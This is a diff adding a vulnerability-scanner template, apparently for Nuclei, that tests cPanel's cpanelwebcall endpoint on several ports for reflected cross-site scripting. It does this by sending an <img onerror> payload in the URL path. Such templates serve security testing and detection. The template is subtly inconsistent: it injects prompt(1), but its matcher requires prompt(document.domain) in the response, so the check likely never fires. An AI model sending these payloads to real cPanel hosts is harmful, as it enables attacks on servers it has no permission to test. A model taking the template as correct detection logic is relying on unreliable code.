@@ -1,0 +1,25 @@
+id: OFJAAAH-cpanelXSS
+
+info:
+    name: cpanelXSS
+    author: ofjaaah,wellpunk
+    severity: high
+    tags: cpanel
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}:2082/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+      - '{{BaseURL}}:2086/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+      - '{{BaseURL}}/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+      - '{{BaseURL}}:2083/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<img src=x onerror="prompt(document.domain)">aaaaaaaaaaaa'
+          - 'Invalid webcall ID:'
+      - type: status
+        status:
+          - 400
